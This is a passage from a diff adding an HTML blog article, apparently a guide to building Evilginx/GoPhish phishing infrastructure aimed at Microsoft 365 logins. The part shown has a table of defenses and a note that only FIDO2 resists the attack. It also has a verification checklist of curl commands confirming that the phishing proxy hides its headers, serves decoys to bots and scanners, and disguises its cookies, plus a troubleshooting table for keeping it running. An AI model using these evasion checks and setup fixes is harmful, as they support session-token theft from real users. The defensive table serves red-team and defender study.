+                        <td><strong>Conditional Access &mdash; block unknown locations</strong></td>
+                        <td>The attacker's VPS IP will not match any named location in your tenant policy.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Continuous Access Evaluation (CAE)</strong></td>
+                        <td>Revokes tokens faster when anomalies are detected, reducing the attacker's usable window after token theft.</td>
+                    </tr>
+                    <tr>
+                        <td><strong>DMARC <code>p=reject</code> on the receiving organisation</strong></td>
+                        <td>Blocks spoofed emails from reaching the inbox in the first place.</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <blockquote>
+                <p><strong>The key takeaway:</strong> Regular authenticator app MFA (SMS codes, push notifications) does <strong>not</strong> stop AiTM phishing. The session token is captured <em>after</em> MFA completes &mdash; the attacker already has an authenticated session. FIDO2 hardware keys are the only MFA method that is inherently resistant to this attack, because the authentication is cryptographically tied to the real website domain. A phishing domain simply cannot satisfy that binding.</p>
+            </blockquote>
+
+            <hr>
+
+            <h2 id="verification">7. Verification Checklist</h2>
+
+            <p>Run these checks after the full setup is complete:</p>
+
+            <div class="cmd-block">
+                <div class="cmd-header">
+                    <span class="cmd-tool"><i class="fas fa-terminal"></i> Terminal</span>
+                    <button class="cmd-copy"><i class="fas fa-copy"></i> Copy</button>
+                </div>
+                <div class="cmd-body">
+                    <code><span class="prompt">#</span> 1. No Evilginx or GoPhish headers in responses</code>
+                    <code><span class="prompt">$</span> curl -sI https://login.apex-corp.xyz | grep -i -E "x-|server"</code>
+                    <code><span class="prompt">#</span> Expected: Server: nginx/1.18.0 (Ubuntu) and nothing else</code>
+                    <code></code>
+                    <code><span class="prompt">#</span> 2. Bots get the decoy site, not a real error</code>
+                    <code><span class="prompt">$</span> curl -A "curl" https://login.apex-corp.xyz | head -5</code>
+                    <code><span class="prompt">$</span> curl -A "nmap" https://login.apex-corp.xyz | head -5</code>
+                    <code><span class="prompt">#</span> Expected: Apex Corp HTML</code>
+                    <code></code>
+                    <code><span class="prompt">#</span> 3. Random scanner paths also get the decoy site</code>
+                    <code><span class="prompt">$</span> curl -s https://login.apex-corp.xyz/wp-admin | head -5</code>
+                    <code><span class="prompt">$</span> curl -s https://login.apex-corp.xyz/.env | head -5</code>
+                    <code><span class="prompt">#</span> Expected: Apex Corp HTML</code>
+                    <code></code>
+                    <code><span class="prompt">#</span> 4. Lure path without a valid token &rarr; decoy site</code>
+                    <code><span class="prompt">$</span> curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \</code>
+                    <code>  https://login.apex-corp.xyz/access | head -5</code>
+                    <code><span class="prompt">#</span> Expected: Apex Corp HTML</code>
+                    <code></code>
+                    <code><span class="prompt">#</span> 5. Lure with valid token &rarr; proxied to Evilginx</code>
+                    <code><span class="prompt">$</span> curl -sI -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \</code>
+                    <code>  "https://login.apex-corp.xyz/access?utm_source=scarlet24"</code>
+                    <code><span class="prompt">#</span> Expected: 302 redirect toward Microsoft login</code>
+                    <code></code>
+                    <code><span class="prompt">#</span> 6. Certificate transparency &mdash; only wildcard should appear</code>
+                    <code><span class="prompt">#</span> Visit: https://crt.sh/?q=apex-corp.xyz</code>
+                    <code><span class="prompt">#</span> Should NOT show individual subdomain certs (auth-prod, etc.)</code>
+                    <code></code>
+                    <code><span class="prompt">#</span> 7. Cookie format in browser DevTools</code>
+                    <code><span class="prompt">#</span> After visiting lure &mdash; cookie name should NOT be xxxx-xxxx</code>
+                    <code><span class="prompt">#</span> Cookie value should NOT be 64 unbroken hex characters</code>
+                </div>
+            </div>
+
+            <hr>
+
+            <h2 id="troubleshooting">8. Troubleshooting Reference</h2>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Problem</th>
+                        <th>Likely Cause</th>
+                        <th>Fix</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Caddy returns 502</td>
+                        <td>Evilginx not running on port 8443</td>
+                        <td><code>systemctl start evilginx</code></td>
+                    </tr>
+                    <tr>
+                        <td>Site cannot be reached</td>
+                        <td>DNS not propagated or wrong Cloudflare proxy setting</td>
+                        <td>Wait a few minutes; confirm grey cloud on all login subdomains</td>
+                    </tr>
+                    <tr>
+                        <td>Microsoft page loads but is broken</td>
+                        <td>Missing DNS record for a phishlet subdomain</td>
+                        <td>Verify all <code>phish_sub</code> values have grey-cloud A records in Cloudflare</td>
+                    </tr>
+                    <tr>
+                        <td>SSL errors in Evilginx</td>
+                        <td>Wrong cert path</td>
+                        <td>Verify certs exist at <code>~/.evilginx/crt/sites/o365/</code></td>
+                    </tr>
+                    <tr>
+                        <td>GoPhish emails not arriving</td>
+                        <td>Postfix not running or config issue</td>
+                        <td><code>tail -50 /var/log/mail.log</code>; check Postfix status</td>
+                    </tr>
+                    <tr>
+                        <td>Roundcube cannot send mail</td>
+                        <td>SMTP auth values set</td>
+                        <td>Set <code>smtp_user = ''</code> and <code>smtp_pass = ''</code> in <code>config/config.inc.php</code></td>
+                    </tr>
+                    <tr>
+                        <td>Cookies still show <code>xxxx-xxxx</code> format</td>
+                        <td>E9 modification was not compiled</td>
+                        <td>Rebuild Evilginx with the cookie name change applied</td>
+                    </tr>
+                    <tr>
+                        <td>Token gate not working after restart</td>
+                        <td>Cookie name in Caddyfile is outdated</td>
+                        <td>Run <code>curl -sI</code> to get new cookie name, update Caddyfile, run <code>systemctl reload caddy</code></td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <hr>
+
+            <h2 id="references">9. References & Resources</h2>
+
+            <p>This project was inspired by the following resources:</p>
+
+            <ul>
+                <li><a href="https://byt3bl33d3r.substack.com/p/taking-the-pain-out-of-c2-infrastructure" target="_blank" rel="noopener">Taking the Pain Out of C2 Infrastructure &mdash; byt3bl33d3r</a></li>
+                <li><a href="https://knifesec.com/blog/kcaddy-redirector-evilginx/" target="_blank" rel="noopener">Kcaddy Redirector for Evilginx &mdash; Knifesec</a></li>
+                <li><a href="https://github.com/An0nUD4Y/Evilginx-Phishing-Infra-Setup" target="_blank" rel="noopener">Evilginx Phishing Infrastructure Setup &mdash; An0nUD4Y</a></li>
+            </ul>
+
+            <!-- Share -->
+            <div class="share-section">
+                <h4>Share this article</h4>
+                <div class="share-buttons">
+                    <button class="share-btn" data-action="twitter"><i class="fab fa-x-twitter"></i> Twitter</button>
+                    <button class="share-btn" data-action="linkedin"><i class="fab fa-linkedin"></i> LinkedIn</button>
+                    <button class="share-btn" data-action="telegram"><i class="fab fa-telegram"></i> Telegram</button>
+                    <button class="share-btn" data-action="copy"><i class="fas fa-link"></i> Copy Link</button>
+                </div>
+            </div>
+
+        </article>
+    </main>
+
+    <footer class="article-footer" style="position:relative;z-index:1;">
+        <p>&copy; 2025 <a href="/">0x1Ak4sh</a> - All rights reserved.</p>
+    </footer>
+
+    <button class="back-to-top" title="Back to top">
+        <i class="fas fa-arrow-up"></i>
+    </button>
+
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/jquery.magnific-popup.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+    <script src="/js/snake.js"></script>
+    <script src="/js/article.js"></script>
+</body>
+</html>
